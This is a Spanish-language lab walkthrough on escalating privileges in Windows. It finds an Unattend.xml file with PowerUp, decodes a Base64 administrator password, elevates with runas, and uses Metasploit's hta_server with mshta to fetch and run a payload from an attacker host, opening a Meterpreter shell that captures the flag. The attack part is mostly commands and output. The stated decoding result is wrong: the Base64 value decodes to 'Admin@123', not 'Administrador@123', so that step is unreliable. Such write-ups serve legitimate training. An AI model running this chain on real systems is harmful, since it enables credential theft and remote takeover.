# 🪟 Escalada de Privilegios: Instalación Desatendida (Unattend.xml)

## 🎯 Objetivo

Explorar un fallo de configuración muy común en entornos Windows: los archivos de instalación desatendida (`Unattend.xml`) que almacenan credenciales codificadas en Base64. Se identifica el archivo mediante **PowerUp.ps1**, se decodifica la contraseña del administrador, se eleva una consola con `runas` y se obtiene una sesión Meterpreter de alto privilegio para capturar la bandera.

---

## 🔍 1. Enumeración de vulnerabilidades de escalada local

Se utiliza el script **PowerUp.ps1** del framework **PowerSploit**, que automatiza la búsqueda de vectores comunes de escalada de privilegios.

### 📁 Ruta del script

```
C:\Users\student\Desktop\PowerSploit\Privesc\PowerUp.ps1
```

### ⚡ Carga y ejecución de PowerUp

```powershell
cd .\Desktop\PowerSploit\Privesc\
ls
```

Allí debe aparecer `PowerUp.ps1`. Para importarlo y ejecutar la auditoría:

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

| Comando | Descripción |
|---------|-------------|
| `powershell -ep bypass` | Inicia PowerShell con la política de ejecución desactivada (permite cargar scripts no firmados) |
| `. .\PowerUp.ps1` | Importa las funciones del script en la sesión actual |
| `Invoke-PrivescAudit` | Ejecuta la auditoría de escalada de privilegios |

**Salida esperada (fragmento):**
```
[*] Checking for unattended install files...
[+] Unattend.xml found in C:\Windows\Panther\Unattend.xml
[+] Unattend.xml may contain credentials.
...
```
La función detecta que existe un archivo `Unattend.xml` y advierte que podría contener credenciales.

---

## 📄 2. Extracción de la contraseña codificada

`Unattend.xml` es el archivo de respuestas que Windows utiliza durante la instalación automatizada. Puede almacenar contraseñas en texto plano o codificadas en Base64.

### 🔍 Lectura del archivo

```powershell
cat C:\Windows\Panther\Unattend.xml
```

Dentro del XML se encuentra una sección similar a:

```xml
<AdministratorPassword>
    <Value>QWRtaW5AMTIz</Value>
    <PlainText>false</PlainText>
</AdministratorPassword>
```

🔐 La contraseña está codificada en Base64: **`QWRtaW5AMTIz`**

---

## 🧪 3. Decodificación de la contraseña

Se utilizan las funciones nativas de .NET desde PowerShell para convertir la cadena Base64 a texto claro.

```powershell
$password = 'QWRtaW5AMTIz'
$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

**Resultado:**  
`Administrador@123`

| Método / Propiedad | Función |
|---------------------|---------|
| `[System.Convert]::FromBase64String()` | Convierte una cadena Base64 en un array de bytes |
| `[System.Text.Encoding]::UTF8.GetString()` | Convierte los bytes en una cadena UTF‑8 |

✅ La contraseña del usuario `Administrator` es **`Administrador@123`**.

---

## 🔑 4. Ejecución de comandos como Administrador (runas)

Con la contraseña conocida, se puede elevar una consola de comandos sin necesidad de exploits adicionales.

```cmd
runas.exe /user:administrator cmd
```

Cuando solicite la contraseña, escribir `Admin@123` (o la variante correcta, en el ejemplo es `Administrador@123`).  
En este laboratorio, el prompt se muestra así:

```
Enter the password for administrator:
```

Tras la autenticación exitosa, se abre una nueva ventana de `cmd.exe` con el contexto del administrador. Para comprobarlo:

```cmd
whoami
```

**Salida:**  
`administrator`

---

## 🚀 5. Obtención de una sesión Meterpreter (opcional, para captura de bandera)

Si se desea una shell más robusta, se puede usar un módulo de Metasploit que entrega un payload vía HTA.

### 🌐 En la máquina Kali (Metasploit)

```bash
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

El módulo genera una URL maliciosa que descarga y ejecuta una aplicación HTML (HTA) capaz de devolver un Meterpreter.

**Salida esperada:**
```
[*] Using URL: http://10.10.31.2:8080/Bn75U0NL8ONS.hta
[*] Server started.
```

> 🔔 La URL generada varía en cada ejecución; se debe copiar la que aparezca en la consola.

### 🖥️ En la máquina Windows (CMD elevado)

Dentro de la consola `cmd` que se abrió con `runas`, ejecutar:

```cmd
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

**Resultado en Metasploit:**
```
[*] 10.10.31.3     hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.31.3
[*] Meterpreter session 1 opened (10.10.31.2:4444 -> 10.10.31.3:49167)
```

✅ Sesión Meterpreter con privilegios de **Administrador**.

---

## 🏁 6. Captura de la bandera

Dentro de Meterpreter:

```bash
meterpreter > sessions -i 1
meterpreter > shell
```

Navegar al escritorio del administrador:

```cmd
cd C:\Users\Administrator\Desktop
dir
```

**Salida esperada:**
```
 Volume in drive C has no label.
...
01/01/2025  01:00 AM                36 flag.txt
```

```cmd
type flag.txt
```

**Bandera obtenida:**  
`097ab83639dce0ab3429cb0349493f60`

---

## 🧠 Resumen del ataque

| Paso | Herramienta / Comando | Propósito |
|------|------------------------|-----------|
| 1 | `PowerUp.ps1` (`Invoke-PrivescAudit`) | Detectar archivos de instalación desatendida |
| 2 | `cat Unattend.xml` | Leer la contraseña codificada |
| 3 | `[System.Convert]::FromBase64String()` | Decodificar la contraseña |
| 4 | `runas.exe /user:administrator cmd` | Ejecutar un shell como administrador |
| 5 | `exploit/windows/misc/hta_server` + `mshta` | Obtener Meterpreter |
| 6 | `type flag.txt` | Leer la bandera |

Los archivos de instalación desatendida son un tesoro para los atacantes, ya que a menudo contienen credenciales codificadas (no cifradas) que permiten la escalada inmediata al usuario más privilegiado del sistema.
